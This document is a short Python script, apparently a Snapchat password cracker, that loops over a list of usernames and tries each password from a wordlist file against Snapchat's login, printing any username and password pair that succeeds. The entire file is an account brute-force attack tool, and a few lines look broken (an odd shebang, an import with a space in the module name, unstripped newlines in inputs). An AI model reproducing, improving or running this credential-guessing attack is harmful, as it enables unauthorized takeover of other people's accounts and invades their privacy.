#!/lewan

from py snap import Snapchat
import sys
import os

def lewan(username):
	print("now cracking: " + username)
	snapchat = Snapchat()
	passwords = open("lewan.txt","r")
	i = 0
	for password in passwords:
		result = snapchat.login(username,password)
		if (result['logged']!=False):
			print("success: username: " + username + "\t password: " + password)
			break
		else:
			print(str(i))
			i+=1

names = open("users/lewan.txt","r")
for name in names:
	lewan(name)
